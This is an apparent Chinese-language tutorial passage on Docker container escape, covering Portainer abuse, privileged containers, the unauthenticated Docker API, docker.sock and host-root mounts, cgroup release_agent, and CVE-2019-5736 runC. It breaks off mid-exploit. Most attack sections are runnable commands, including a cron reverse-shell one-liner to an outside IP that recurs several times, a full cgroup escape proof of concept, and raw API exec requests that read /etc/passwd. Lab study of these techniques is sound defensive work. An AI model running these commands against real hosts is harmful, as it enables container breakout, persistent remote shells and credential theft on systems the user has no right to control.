> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tiniAQ5AhCXm2_mqj_j7iA)

什么是 Docker
----------

Docker 是一个开源的引擎, 可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署, 包括 VMs(虚拟机)、bare metal、OpenStack 集群和其他的基础应用平台。

### 判断当前是否为 docker 环境

首先在我们拿到一个主机权限之后，需要判断该权限所处环境是不是 docker，可以使用下面两条命令

1. 是否存在. dockerenv 文件，若该文件存在则为 docker 环境，若不存在该文件则当前环境非 docker 环境`ls -alh /.dockerenv`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Go7QAicfqQE3WVVGZNg9a4VubcmS3EYFr8fyFR2FqcGSdR2V8U3181Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4rePSIXp7PB7sgB8uXEMPLdHIbZT6MC6eD5fm4x6TWK1fulc8bx9L5g/640?wx_fmt=png)

2. 查询系统进程的 cgroup 信息，docker 环境中的 cgroup 文件普遍存在 docker 字段，而真实环境中不存在 docker 字段`cat /proc/1/cgroup`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4JRLkNWrxC8JKdLV6BPv5BnibtKfDPY4Gd78IZmkGOXFBcEQibicDmExqg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4OkeDpIYQ7O6ic3zex813IhsfqjI60ysJjOcWNp2PqyhBEvXCOfmhp2g/640?wx_fmt=png)

Docker 逃逸
---------

Docker 容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行 EXP 或 POC，就可以返回一个宿主机的高权限 shell，并拿到宿主机的 root 权限，可以直接操作宿主机文件，从容器中逃了出来，因此我们将其称为 Docker 逃逸漏洞。

### Portainer 后台挂载宿主机根目录进行逃逸

Portainer 是一个可视化的容器镜像的图形管理工具，利用 Portainer 可以轻松构建、管理和维护 Docker 环境，而且完全免费，基于容器化的安装方式，方便高效部署。  
需要注意的是后台没有默认账号密码，当第一次登录系统时会提示设置新密码，在实战中可以尝试爆破。

#### 环境搭建

在安装了 docker 的物理机中运行该命令`docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4fqeGXUCvufJ9IRgyZ8kicNVdc2jL2wBNhiaicM5zxHJoSZBUjptnicCO1g/640?wx_fmt=png)

  
部署成功后访问宿主机的 9000 端口，设置用户名与密码  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4k1p73Xs8lyQxjmZpsYNcCo7P1gZD8X36eZYrnaY5tNFwGYrvyQMqyQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4HdWRFLRS2P93vaLDaEKhiaoVR71cL6iaicBvuNj6xsIkVpXicBic4efv8zw/640?wx_fmt=png)

#### 漏洞利用

进入容器中，添加一个新容器  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V42kfZF6uH32VPEDQhpO9XLx34CmOq0GhCKrpU0s2Ib3uh7bicEFERuvw/640?wx_fmt=png)

进入到 portainer 后台界面  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4JmPr6kJgYpCduwTyZQAkX38tSVkEYXTL8x2f41YJpdfmgp50nicRnGQ/640?wx_fmt=png)

这里给该容器命名并选择一个镜像  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4fwNhCsX0XMib94eXEqVyVnD6SuSdWn03foDu5rYrAPWNhicg9I2S5otA/640?wx_fmt=png)

下滑到 Advanced container settings 将 console 设置为 interactive & tty  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4eACEfI2odL5DnicGibINlvk3tuaBF88vqL8chCPexrNIJzPVvSibsBq9g/640?wx_fmt=png)

然后到 Volumes 中将根目录挂载到容器中  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4soM4hb1jIbFicnklGGqKdr2M7WMZrrDpWnZEDUK58Diao3LFJicnSdTQw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4YrYfpBO7V3SK8PS3Om5PATlr2wSXz5tQSpv5qwTnP2iblt797f78jwQ/640?wx_fmt=png)

然后点击部署即可  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4TrtuqGe4fnXT3XUb1a2wd9icbs4UjLjyKBNrJE8hDmrnF9Mxv1uucFg/640?wx_fmt=png)

部署成功后回到容器中，进入到该容器终端内  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V40ZoRZT8IAicLgFK5wqsYVDW2zM39FYc3GvN1QybdWXjicFBKI3ZRa7PA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V45tPWCSQpUuicOdKXTgKzhaJOgeQZRDkd0ISU9q7q9q7VmTncXb0ANibw/640?wx_fmt=png)

  
进入到终端后，输入如下命令`ls /tide/  
chroot /tide/ bash`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4WhvpiaspZh8GAzxPGgYdDLBAF7bwqH3jkzQN5w0bS4Lib0AU6ycOWsOw/640?wx_fmt=png)

如此成功逃逸到宿主机中，也可直接反弹 shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Pc3JNU1HyqtWzs1e8G7PVa65ror6F0wVqZtnYS4aibHIWnDiaUNpm1cQ/640?wx_fmt=png)

### privileged 特权模式启动容器

特权模式逃逸是一种最简单有效的逃逸方法，该漏洞的原理是宿主机使用 root 用户或使用 sudo 命令启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载到容器内部，获取对整个宿主机的文件读写权限，可直接通过 chroot 切换根目录、写 ssh 公钥和 crontab 计划等逃逸到宿主机。

#### 特权模式与非特权模式的区别

*   • `Linux Capabilities`
    

1.  1. 普通模式下容器内进程只可以使用有限的一些 Linux Capabilities
    
2.  2. 特权模式下的容器内进程可以使用所有的 Linux Capabilities
    

*   • Linux 敏感目录 1. 普通模式下，部分内核模块路径比如 / proc 下的一些目录需要阻止写入、有些又需要允许读写，这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求 2. 特权模式下，这些目录将不再以 tmpfs 文件系统的方式挂载
    
*   • 任何内核文件都是可读写 1. 普通模式下，部分内核文件系统（sysfs、procfs）会被只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核 2. 特权模式下，内核文件系统将不再以只读的方式被挂载
    
*   • APPArmor 和 Seccomp
    

1.  1. 普通模式下，可以通过配置 APPArmor 或 Seccomp 相关安全选项
    
2.  2. 特权模式下，这些 AppArmor 或 Seccomp 相关配置将不再生效
    

*   • cgroup 读写
    

1.  1. 默认情况下，只能以只读模式操作 cgroup
    
2.  2. 特权模式下，将可以对 cgroup 进行读写操作
    

*   • /dev
    

1.  1. 普通模式下，容器内 / dev 目录下看不到节点 / dev 目录下特有的 devices
    
2.  2. 特权模式下，容器内的 / dev 目录会包含这些来自节点 / dev 目录下的那些内容
    

*   • SELinux
    

1. 特权模式下，SELinux 相关的安全加固配置将被禁用

2. 普通模式下也可以通过对应的安全选项来禁用 SELinux 特性

#### 判断方法

在容器中可以使用该命令检测当前容器是否以特权模式启动`cat /proc/self/status | grep Cap`如果是特权模式启动的话，CapEff 对应的掩码值在 centos 中为 0000001fffffffff ，在 ubuntu 中为 0000003fffffffff，如下图  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4jjq7N1wmuTF044fJ0k9DQoKRicvScO59IiaV1sBibJ7sSkrFPbfcae0UQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ysU8rrpja9NDh1OlDich4CfqkcWE9NkFrnngaWPnfr1NbvtqHVrwpeA/640?wx_fmt=png)

#### 环境搭建

在安装有 docker 机器的主机上直接运行该命令，启动该容器即可。`docker run -it --privileged ubuntu:18.04` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4HIb9bZJvrt1aKPgsz3y7QQiaJdG67zN3ROo00Jrk6Kn6emibNzib4mwQw/640?wx_fmt=png)

#### 漏洞利用

首先我们为了区别宿主机与 docker 容器的区别，我们先在宿主机中新建一个文件，作为标识区别  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4PhLYRia3AAhSU1zWqJoKR5OtjM8PvUyEkmg8FCa0M785Tz8ABfjqeEA/640?wx_fmt=png)

  
在启动后我们会进入到 docker 容器的 bash 中，在这里我们查看当前主机的 docker 是否为特权模式启动。`cat /proc/self/status | grep Cap`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4HcJDlqmibxj1JBiaAXbNibYroYgv2nZ1es35Z0PTww8C6yvdDyTm0Bfaw/640?wx_fmt=png)

  
我们可以将宿主机目录挂载到该 docker 容器中，首先查看当前磁盘分区情况，获得宿主机分区`fdisk -l` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4hPoeP0hN0nepNESIicFVTlvsq5Wt3EqHgP9IS9syOVgTZdKD9mCiaTGQ/640?wx_fmt=png)

  
这里我们根据分区大小得知到宿主机的磁盘为 / dev/dm-0，这时可以直接挂载宿主机的磁盘`mkdir tide  
mount /dev/dm-0 /tide/  
chroot /tide/`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ndPdxJqmkEjtzOTeNPFBYCmHWSnAwpb7KbnYWSap4oYHwWDpEb7aTg/640?wx_fmt=png)

  
这时我们会进入一个 bash 会话，在这里可以查看宿主机的 / etc/passwd 等敏感文件  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4FEHY3Gfib6uYc5JOSV2ve1naHXa4aVvMch7J2MLzvYmum2855JZpdFQ/640?wx_fmt=png)

  
这时去查看刚刚我们在宿主机根目录中创建的 flag.txt 文件，看其是否存在，就能判断出我们当前是否已经成功跳出 docker 容器  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4faiabr1v1xwukMHOgEwgUXa6VAkpjr3Q4JbxgXsXnB4WHWIErq4sEgg/640?wx_fmt=png)

  
这里可以看到我们现在已经成功跳出了 docker 容器，获得了宿主机的权限，可以使用计划任务反弹 shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4jSnU4RIFibEshaLlQuYp3F13sXaAyL2ia5EGltIWztk4S0Rbbt9HxOIQ/640?wx_fmt=png)

### Docker API 未授权访问

该漏洞起因是因为使用 Docker Swarm 时，管理的 docker 节点上便会开放一个 TCP 端口 2375/2376，绑定在 0.0.0.0 上，如果没有做限制访问来源的话，攻击者可以通过 Doker 未授权来控制服务器。

#### 环境搭建

在 vulhub 中存在该漏洞复现环境，部署命令如下：`cd docker/unauthorized-rce/  
docker-compose build  
docker-compose up -d   
docker-compose ps` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4BDEjpCZSDP9StQID4coBFq6bUOHd0gozxCXwYCg7JiaJ8Cl9vYOepNg/640?wx_fmt=png)

也可以在真实 Docker 中部署该环境，部署步骤如下：`#下载环境  
curl -o /etc/yum.repos.d/Centos-7.repo http://mirrors.aliyun.com/repo/Centos-7.repo  
curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo  
yum clean all && yum makecache`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4PVN2r2x06WvFUtZXcn5snGXiaLXTWibVC3EmegwCDctO2WJ4ETelL8Tw/640?wx_fmt=png)

安装指定版本 docker `yum install -y docker-ce-18.09.9` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4z6YjTSAKxa2U6qDxrFoffOdiciaF0FEpC8UOwFua4CDRxJpicWuyLZKtg/640?wx_fmt=png)

配置加速源 `vim /etc/docker/daemon.json  
 { "registry-mirrors" : [ "https://8xpk5wnt.mirror.aliyuncs.com" ]}`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ibPDGfHRfvV4uMlW0Y5adJKRu02sFbXmAaNoYrcMfSt0D0ib46Uic33Qw/640?wx_fmt=png)

设置开机自启：`systemctl enable docker   
systemctl daemon-reload`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V45hZPNGSnspwOeFFerHsLQabib2nL0s6Vvt3z611XBTfCQGaMl7icvAUQ/640?wx_fmt=png)

启动 contianerd 服务：`containerd  #启动  
systemctl status containerd # 查看服务状态`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4AO6gKqtFv3Uv2kibzoA7POfOqrznXMKClxWKWSicskfaqrAZvk4MmFibw/640?wx_fmt=png)

开启 2375 端口，提供外部访问：`vim /usr/lib/systemd/system/docker.service  
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375  -H fd:// --containerd=/run/containerd/containerd.sock`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4yCzvNjXfjC7Lck15xSVkcdMOeWp87t8asBwSdUiahAe37wPrS4Z28gw/640?wx_fmt=png)

改完之后需要重启：`systemctl daemon-reload  
systemctl restart docker` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ibgCprXaYYoY1G8cCjJNia7kSK6MfbPeINI04y1QQdqvibwwU8lm30Sicg/640?wx_fmt=png)

然后我这里还需要在防火墙中将 2375 端口放行，命令如下：`systemctl start firewalld  
firewall-cmd --zone=public --add-port="2375"/tcp --permanent  
firewall-cmd --permanent --query-port="2375"/tcp  
systemctl restart firewalld`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4q8L5ia0qt9sSvGPkhlCUskFqLhkaiawf1gWDNibVsJ0BRhSrY2o5LBvKA/640?wx_fmt=png)

接下来我们访问该 ip 的 2375 端口即可，当我们访问时会返回 404 page not found。这是 Docker RemoteAPI，可以执行 docker 命令。  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ibctar1nOYyibBIgVIEwCsVbpBmsbp2YkJDZsYdv4wqvDUVwU2oB4pJQ/640?wx_fmt=png)

这里如果我们继续访问 http://192.168.198.129:2375/version，会返回 docker 的版本信息，这样证明该漏洞存在。  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4jeBTN0w38A99yjB0KoX7p1h2lQNxZKGzYwIqxkPx4ALTHKibsFXvofA/640?wx_fmt=png)

比如访问 http://192.168.198.129:2375/containers/json 会返回 docker 信息，和在 docker CLI 上执行 docker ps 的效果一样，其他操作比如创建 / 删除 container，拉取 image 等操作也都可以通过 API 调用完成。  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4NMVp5Zqn5wBnNGxcBK68k9Oel2zrGk4Y5B1HGYTYH6FrIkdAqTDgzw/640?wx_fmt=png)

#### 漏洞利用

#### 利用方法 1 命令执行

访问 http://192.168.198.129:2375/containers/json 获得刚刚返回的 exec_id 的参数，构造如下数据包：  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4nqwacHK00ufFD0bTsLDjBcZFI6DhRCN8uYURPuAGwXc3naT55wAN7A/640?wx_fmt=png)

`POST /containers/7badb971f85814c718dcc4efdd34fead171ebdbb099bc5252f02785374e24b0f/exec HTTP/1.1  
Host: 192.168.198.138:2375  
Content-Type: application/json  
Content-Length: 168  
{  
"AttachStdin":true,  
"AttachStdout":true,  
"AttachStderr":true,  
"Cmd":[  
"cat","/etc/passwd"  
],  
"DetachKeys":"ctrl-p,ctrl-q",  
"Privileged":true,  
"Tty":true  
}`注意其中 cmd 的字段，这就是我们要执行的命令，发送后会得到第二个 id，这里需构造一个 exec_start 数据包，内容如下。  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4rUayPvL5sKx1bpNTwTBicfdUjJsvxhiafb4ib3RoJql7mibMz4oScAJ47A/640?wx_fmt=png)

`POST /exec/962fee39c29a2c9d5ea984b55673a7823aa06b6187eaf4be279f25af6cecad1f/start HTTP/1.1  
Host: 192.168.198.138:2375  
Content-Type: application/json  
Content-Length: 36  
{  
"Detach":false,  
"Tty":false  
}`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4JgzztMzxoib6YFk7BTdM1qxWwia19RWuqQhetAAYBWaM0G9jNUczSkNg/640?wx_fmt=png)

然后发送就会得到结果，至此成功获得该 docker 主机的 rce 权限，但无法逃逸到宿主机中。

#### 利用方法 2 远程连接，新建特权容器，逃逸到宿主机中

因为 docker 有远程连接命令，由于 2375 端口暴露，可未授权访问，所以现在可以在我们的主机上通过远程方式连接 doker ，然后以特权模式启动一个 docker 容器，从而达到逃逸到宿主机的情况`docker -H tcp://192.168.198.138:2375 ps  
docker -H docker -H tcp://192.168.241.142:2375 run -it --privileged alpine bin/sh`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Z78hHk57UVCaibOWfx8dicRyNYkSpIXF5yGVTMyo674GvaR5GTO8lkJA/640?wx_fmt=png)

进入容器后，使用 fdisk -l 命令查看磁盘文件`fdisk -l`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Lc7n1Fn9yRu3dthNSEUnakiaUxp5I07nw96d3L8eiaG2J3IlX2PGENibg/640?wx_fmt=png)

分区大小得知到宿主机的磁盘为 / dev/dm-0，这里可以使用上面我们刚刚特权模式逃逸的命令将该磁盘挂载到目录中`mkdir /tide/  
mount /dev/dm-0 /tide/  
chroot /tide/`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4V7cf9L4jqMMLGByUZ2aAyic3XarDzREjIrm6cdCr1Y4sOS8SffIl4gA/640?wx_fmt=png)

成功逃逸到宿主机

### 挂载 Docker.sock

Docker 架构相当于 C/S 架构，docker.sock 就是 docker 中套 docker，docker 的 client 和 server 的通信模式参考: https://www.jb51.net/article/99019.htm  
利用 docker.sock 逃逸的前提条件

3. 攻击者获得了 docker 容器的访问权限

4. 容器已安装 / var/run/docker.sock

#### 环境搭建

创建 Docker`docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4fOwVZWBY9LTiaI6xgY8AMQJGCxlbDicY7ibZdvOuSYmwlBP9gDNqWyhDQ/640?wx_fmt=png)

随后在 docker 容器中安装 docker`# ubuntu 18.04安装docker   
apt-get update   
# 安装依赖包   
apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common   
# 添加 Docker 的官方 GPG 密钥   
curl -fsSL https://download.docker.com/linux/ubuntu/gpg |  apt-key add -   
# 验证当前是否拥有带有指纹的密钥   
apt-key fingerprint 0EBFCD88   
# 设置稳定版仓库   
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"   
# 更新   
apt-get update   
# 安装最新的Docker-ce    
apt-get install docker-ce   
# 启动   
systemctl enable docker   
systemctl start docker` 

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4kogbfamo1sSD0Zc5epiaH0qNoInIBGpOGWW3h3br4fOazG159Oicg94Q/640?wx_fmt=png)

这时安装完成后我们就可以使用 docker ps 来看到宿主机上的容器了。

#### 漏洞利用

将宿主机的根目录挂载到容器中`docker run -it -v /:/tide ubuntu:18.04 /bin/bash   
chroot tide`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4dTNl0Q2RXbj3qaQ4rtH0eBqSuibGOQjU9yFSaMc9zJF76sdtvEHmuTA/640?wx_fmt=png)

这时可以看到返回出一个 bash 会话，这里我们就可以看到我们之前在宿主机中创建的 flag.txt 了  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4zNfCUhMrAm8aBvP7lGTGOh4XntfdicSnP0Iu1ubFkJV0VrTM5f6X2tw/640?wx_fmt=png)

这里也可以使用计划任务反弹 shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4iaYSEZrgNwZibOzBmA3GbtvVLCtfvNZlfjwlEUFBW5fq0v0PS9SVGicPg/640?wx_fmt=png)

### 挂载宿主机根目录

如果在 docker 启动的时候挂载了宿主机的根目录，就可以通过 chroot 获取宿主机的权限`docker run -it -v /:/tide/ ubuntu:18.04  
chroot /tide/`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4GaOm1iafmfgrdj68AFGyRpcdrzP7EPD5diboiapjiaMf6p70DUmXTLLgYQ/640?wx_fmt=png)

相同也可以通过计划任务反弹 shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V47GQ1HDnrucSibWhKQlzmf2osickwD8BQlz9NATK1DOLgD3DXYicUSvia9w/640?wx_fmt=png)

### Cgroup 执行宿主机系统命令

docker 使用 cgroup 进行资源限制，当 cgroup 中最后一个任务结束且 notify_on_release 开启，release_agent 可执行事先提供的命令，因此可以利用这个特性来实现容器的逃逸。

#### 漏洞利用条件

```shell

1. 以 root 用户身份在容器内运行 2. 使用 SYS_ADMINLinux 功能运行 3. 缺少 APPArmor 配置文件，否则将允许 mountsyscall 4.cgroup V1 虚拟文件系统必须以读写方式安装在容器内

```
#### 环境搭建
```shell
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04  
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Niaa5EIfhX4ltibPAILZBeGq7ebfosMNbZtaTpk24Y2pXeNpdfILvWsw/640?wx_fmt=png)

#### 漏洞利用

```
# 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x # 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent #  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` echo "$host_path/cmd" > /tmp/cgrp/release_agent # 写入自定义命令 echo '#!/bin/sh' > /cmd # 结果在当前目录的output文件中 echo "cat /flag.txt > $host_path/output" >> /cmd chmod a+x /cmd # 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Izx6hSh2icjCG0UAkSADjoyXfPjBpxibmKDbK5zZx5p2Lgjybzkb7jGQ/640?wx_fmt=png)

如上图所示，成功获取到宿主机根目录的 flag.txt 的内容，同理，我们将上面 poc 中的 echo 中的命令修改为反弹 shell 的命令，即可进行反弹 shell，获得宿主机的权限。

```
echo "echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root">> /cmd 
chmod a+x /cmd 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4yup5X7BQ5cxLKOxhGEBkrQJjO9rlPNI5biaETOCZRRK6KbyGNrzU7yg/640?wx_fmt=png)

### runC 逃逸 - CVE-2019-5736

cve-2019-5736 属于 docker 环境逃逸类型漏洞，该漏洞利用 runC 文件被覆盖，当管理员通过 exec 进入容器的时候，触发 payload，从而达到逃逸 。个人理解这种方式利用的条件其实比较苛刻，主要苛刻在宿主机中必须有管理员使用 exec 进入当前 docker 环境，如果宿主机没有在运行 EXP 后进入该容器的话，是无法进行逃逸的。

#### 影响版本

```
docker version <=18.09.2 RunC version <=1.0-rc6
```

#### 环境搭建

在部署该环境时，需要先将之前系统上所安装的 docker 卸载掉安装 18.06 版本的 docker，我这里直接恢复了还没安装 docker 时的快照，故直接安装即可。

```
curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh  
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4icsnTibLTyLgMoQQHRv73w4G5VpE5t5uwSibNpJCKiajB3zrWJ4JuSWBdg/640?wx_fmt=png)

另外可以使用 Metarget 去直接部署环境，操作命令如下：  
安装 Metarget

```
git clone https://github.com/brant-ruan/metarget.git
cd metarget/
pip3 install -r requirements.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4GuqIvJysfWOQFbyOiapumpAib6wgAFAakXaRQ7kjprhGT1tGJjrmm4BA/640?wx_fmt=png)

部署 cve-2019-5736

```
./metarget cnv install cve-2019-5736
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4TKO1shiaiaeV4Wl6jibdMGmWpjLwZSzHfk7UneEMuIrEpkyb41qbfZNZw/640?wx_fmt=png)

如上，已成功搭建好符合版本的 docker 环境，接下来我们启动一个 docker 容器即可

```
docker run -it ubuntu:18.04
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4JoUb5Qky3Dbibj63YdcvOwRickMLZ50JBTNucBcUJqu56sLCUug86ibUQ/640?wx_fmt=png)

#### 漏洞利用

下载 EXP

```
git clone https://github.com/Frichetten/CVE-2019-5736-PoC 
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4P1PU9OKZsGfhGyuzXicGf6UD0uFmd4mQmlib4J4ovIbDbVK1Cz6Wrd6g/640?wx_fmt=png)

修改 payload 为反弹 shell  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4LpSCp6WKkgaKQyqcziarqhtoGYkrCVgkCBkep0gXiczhva2hhyEsOk0w/640?wx_fmt=png)

修改完之后进行编译，

```
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4sp7ibFgnYnBvpUYRJ0OY3ATagM6Wj1hkVbJUqV8pp2Weo1ezsMLUMJQ/640?wx_fmt=png)

编译后会生成一个 main 的可执行文件，这里我们需要将其放到 docker 容器中，在 kali 中启动一个 http 服务，在容器中使用 wget 的命令去下载该文件

```
python3 -m http.server 8080
```

